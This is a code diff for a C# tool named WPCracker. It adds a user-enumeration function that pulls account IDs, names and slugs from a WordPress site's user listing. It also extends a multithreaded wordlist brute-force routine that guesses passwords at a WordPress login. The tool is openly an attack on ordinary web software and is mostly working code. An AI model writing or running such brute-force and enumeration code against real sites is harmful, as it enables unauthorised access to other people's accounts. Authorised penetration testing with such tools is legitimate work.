@@ -1,8 +1,9 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.IO;
-using System.Runtime.InteropServices;
+using System.Net.Http;
 using System.Threading.Tasks;
+using Newtonsoft.Json;
 
 namespace WPCracker
 {
@@ -10,9 +11,6 @@ namespace WPCracker
     {
         public static void BruteForceAttack(string uri, string username, string wordlistPath, int maxThreads, int batchCount)
         {
-            //var maxThreads = 16;
-            //var batchCount = 1000;
-
             var login = new Login(new Uri(uri));
             using var sr = new StreamReader(wordlistPath);
 
@@ -69,6 +67,36 @@ namespace WPCracker
                 if (found)
                     return;
             }
+
+            if (found) return;
+            
+            Console.ForegroundColor = ConsoleColor.Red;
+            Console.WriteLine($"\nPassword for username {username} NOT found!");
+        }
+
+        public static async void UserEnum(string uri)
+        {
+            var client = new HttpClient();
+            var response = await client.GetAsync(uri);
+            response.EnsureSuccessStatusCode();
+            var responseBody = await response.Content.ReadAsStringAsync();
+
+            var list = JsonConvert.DeserializeObject<List<WpUserInfo>>(responseBody);
+
+            Console.ForegroundColor = ConsoleColor.Green;
+            Console.WriteLine($"Found {list.Count} user(s)\n");
+            Console.ForegroundColor = ConsoleColor.Yellow;
+            
+            foreach (var t in list)
+            {
+                Console.WriteLine($"ID:.............{t.Id}");
+                Console.WriteLine($"NAME:...........{t.Name}");
+                Console.WriteLine($"DESCRIPTION:....{t.Description}");
+                Console.WriteLine($"LINK:...........{t.Link}");
+                Console.WriteLine($"URL:............{t.Url}");
+                Console.WriteLine($"SLUG:...........{t.Slug}\n");
+            }
+            Console.ResetColor();
         }
     }
 }
